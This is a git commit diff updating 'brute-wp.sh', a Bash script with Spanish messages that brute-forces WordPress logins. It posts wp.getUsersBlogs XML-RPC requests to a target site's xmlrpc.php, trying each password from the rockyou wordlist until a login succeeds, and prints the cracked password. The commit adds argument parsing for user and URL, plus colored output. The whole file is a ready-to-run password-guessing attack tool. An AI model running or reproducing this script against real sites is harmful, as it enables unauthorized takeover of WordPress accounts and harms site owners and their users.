6fd02917e4f45776ea1236c7c01f66861dfbfb14
Retr0_1000101 <111292579+JoseVazquez101@users.noreply.github.com>
2024-04-04 15:57:18 -0600

    Update brute-wp.sh

--- brute-wp.sh
+++ brute-wp.sh
@@ -1,37 +1,65 @@
 #!/bin/bash
 
 function ctrl_c() {
-  echo -e "\n\n[!] Saliendo..."
+  echo -e "\n\n\033[1;31m[!] Saliendo...\033[0m"
   exit 1
 }
 
-echo -e "Link: " && read link
-echo -e "User: " && read user
-
 trap ctrl_c INT
 
+while [[ $# -gt 0 ]]; do
+  key="$1"
+
+  case $key in
+    -u|--user)
+      user="$2"
+      shift
+      shift
+      ;;
+    --url)
+      link="$2"
+      shift
+      shift
+      ;;
+    *)
+      echo "Opción desconocida: $1"
+      exit 1
+      ;;
+  esac
+done
+
+if [[ -z "$user" ]]; then
+  echo -e "\033[1;33m[!] Por favor, introduce el nombre de usuario con -u o --user.\033[0m"
+  exit 1
+fi
+
+if [[ -z "$link" ]]; then
+  echo -e "\033[1;33m[!] Por favor, introduce la URL con --url.\033[0m"
+  exit 1
+fi
+
 function createXML() {
-  password=$1
-  payload="""
-<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+  local password="$1"
+  payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
 <methodCall>
 <methodName>wp.getUsersBlogs</methodName>
 <params>
 <param><value>$user</value></param>
 <param><value>$password</value></param>
 </params>
-</methodCall>
-"""
+</methodCall>"
 
-  echo $payload > file.xml
+  echo "$payload" > file.xml
   response=$(curl -s -X POST "${link}/xmlrpc.php" -d@file.xml)
-  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
-    echo "[+] Contraseña para $user -> $password"
+  if [ ! "$(echo "$response" | grep 'Incorrect username or password.')" ]; then
+    echo -e "\033[1;32m[+] Contraseña para $user -> $password\033[0m"
     exit 0
   fi
-sleep 5
+  sleep 5
 }
 
-cat /usr/share/wordlists/rockyou.txt | while read password; do
-  createXML $password
+echo -e "\033[1;36m[*] Iniciando...\033[0m"
+
+cat /usr/share/wordlists/rockyou.txt | while read -r password; do
+  createXML "$password"
 done
